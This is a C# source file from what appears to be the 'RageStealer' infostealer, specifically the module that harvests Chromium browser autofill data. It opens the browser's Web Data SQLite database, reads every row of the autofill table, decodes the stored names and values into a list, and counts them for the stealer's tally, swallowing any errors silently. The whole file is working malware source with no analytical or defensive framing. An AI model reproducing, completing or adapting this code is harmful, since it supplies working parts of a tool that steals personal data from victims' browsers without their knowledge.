using System;
using System.Collections.Generic;
using RageStealer.Helper;
using RageStealer.Helpers;

namespace RageStealer.Target.Browsers.Chromium;

internal sealed class Autofill
{
	public static List<AutoFill> Get(string sWebData)
	{
		List<AutoFill> list = new List<AutoFill>();
		try
		{
			SqLite sqLite = SqlReader.ReadTable(sWebData, "autofill");
			if (sqLite == null)
			{
				return list;
			}
			for (int i = 0; i < sqLite.GetRowCount(); i++)
			{
				AutoFill autoFill = default(AutoFill);
				autoFill.Name = Crypto.GetUtf8(sqLite.GetValue(i, 0));
				autoFill.Value = Crypto.GetUtf8(sqLite.GetValue(i, 1));
				AutoFill item = autoFill;
				list.Add(item);
				Counter.AutoFill++;
			}
		}
		catch (Exception)
		{
		}
		return list;
	}
}
